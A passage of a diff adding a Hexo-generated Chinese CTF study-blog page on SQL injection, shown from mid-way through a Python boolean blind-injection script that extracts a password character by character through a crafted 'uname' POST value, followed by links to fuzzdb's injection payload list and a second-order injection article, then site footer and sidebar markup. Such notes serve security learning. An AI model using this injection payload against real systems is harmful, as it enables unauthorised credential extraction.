class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> xrange(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">                    postdata = &#123;</span><br><span class="line">                        <span class="string">&#x27;uname&#x27;</span>:<span class="string">&quot;&#x27;||(ascii(right(left(pwd,&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;),1))=&quot;</span></span><br><span class="line">                        +<span class="built_in">str</span>(c)+<span class="string">&quot;)||&#x27;&quot;</span>,</span><br><span class="line">                        <span class="string">&#x27;pwd&#x27;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    r = s.post(url=url,headers=header,data=postdata)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        pwd += <span class="built_in">chr</span>(c)</span><br><span class="line">                        <span class="built_in">print</span> i,pwd</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">                            get_length() <span class="comment">#length is 30</span></span><br><span class="line">                            get_pwd_char() </span><br></pre></td></tr></table></figure>
+
+<h4 id="Burpsuit-fuzz-判断过滤了哪些字符"><a href="#Burpsuit-fuzz-判断过滤了哪些字符" class="headerlink" title="Burpsuit fuzz 判断过滤了哪些字符"></a>Burpsuit fuzz 判断过滤了哪些字符</h4><p><a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></p>
+<p>这是一个fuzz测试的payload库，上面有大量的测试payload，非常实用，我们本次sql注入就用到它。</p>
+<p>我们使用这个payload就可以了 <a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/detect/xplatform.txt">/attack/sql-injection/detect/xplatform.txt</a></p>
+<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43573676/article/details/105774162?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control">https://blog.csdn.net/qq_43573676/article/details/105774162?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2.control</a></p>
+<p>要点两次才有</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/12/21/IoT%E5%9B%BA%E4%BB%B6%E4%BB%8B%E7%BB%8D%E5%8F%8A%E6%8F%90%E5%8F%96/" rel="prev" title="IoT固件介绍及提取">
+      <i class="fa fa-chevron-left"></i> IoT固件介绍及提取
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/01/20/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89frida/" rel="next" title="安卓逆向学习（二）frida">
+      安卓逆向学习（二）frida <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#union%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.1.</span> <span class="nav-text">union查询</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SQLMAP%E7%9A%84POST%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">SQLMAP的POST注入</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#MYSQL%E5%9F%BA%E4%BA%8E%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2-%E6%8A%A5%E9%94%99%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">MYSQL基于联合查询&#x2F;报错的手工注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MYSQL%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.2.</span> <span class="nav-text">MYSQL盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="nav-number">2.3.</span> <span class="nav-text">SQL注入的防御</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9ASQLbool%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC"><span class="nav-number">3.</span> <span class="nav-text">补充：SQLbool盲注脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Burpsuit-fuzz-%E5%88%A4%E6%96%AD%E8%BF%87%E6%BB%A4%E4%BA%86%E5%93%AA%E4%BA%9B%E5%AD%97%E7%AC%A6"><span class="nav-number">4.</span> <span class="nav-text">Burpsuit fuzz 判断过滤了哪些字符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">二次注入</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lyj789</p>
+  <div class="site-description" itemprop="description">快乐打工人</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lyj789</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">94k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:25</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
